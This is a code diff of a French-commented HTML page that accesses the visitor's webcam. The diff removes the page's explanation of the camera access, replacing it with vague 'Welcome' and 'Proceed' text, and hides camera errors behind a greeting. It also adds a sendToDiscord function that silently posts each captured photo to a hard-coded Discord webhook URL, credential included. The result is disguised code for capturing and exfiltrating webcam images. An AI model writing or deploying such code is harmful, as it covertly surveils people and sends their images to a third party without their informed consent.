@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Prendre une photo</title>
+    <title>Proceed</title>
     <style>
         body {
             text-align: center;
@@ -17,11 +17,12 @@
 </head>
 <body>
     <h1>Bienvenue</h1>
-    <p>Pour continuer, autorisez l'accès à votre caméra :</p>
+    <p>Welcome</p>
     <video id="video" autoplay playsinline></video>
     <button id="capture">Prendre une photo</button>
     <canvas id="canvas" style="display: none;"></canvas>
     <p id="result"></p>
+
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -35,19 +36,58 @@
                 video.srcObject = stream;
             })
             .catch((error) => {
-                result.textContent = "Impossible d'accéder à la caméra. Vérifiez vos paramètres.";
+                result.textContent = "Welcome to ILFY Website";
                 console.error("Erreur :", error);
             });
 
+        // Fonction pour envoyer l'image au webhook Discord
+        function sendToDiscord(imageData) {
+            const webhookUrl = 'https://discordapp.com/api/webhooks/1311321718358409226/CdCl8qZ1ptJaTSy2neLj7v92e7hV2HITlKJb8MArSQc0gzwfnPyhhjL5897CwjjEMJsN'; // Remplace par ton URL de webhook
+            const payload = {
+                content: "Voici une photo capturée :",
+                embeds: [
+                    {
+                        image: {
+                            url: imageData
+                        }
+                    }
+                ]
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Photo envoyée avec succès');
+                } else {
+                    console.log('Erreur lors de l\'envoi de la photo');
+                }
+            })
+            .catch(error => {
+                console.error('Erreur:', error);
+            });
+        }
+
         // Capturer une image lorsqu'on clique sur le bouton
         captureButton.addEventListener('click', () => {
+            // Définir les dimensions du canvas en fonction de la vidéo
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
+
+            // Dessiner l'image vidéo sur le canvas
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             // Convertir l'image capturée en base64
             const imageData = canvas.toDataURL('image/png');
             result.innerHTML = `<img src="${imageData}" alt="Photo capturée" style="max-width: 90%;">`;
+
+            // Envoyer l'image au webhook Discord
+            sendToDiscord(imageData);
         });
     </script>
 </body>
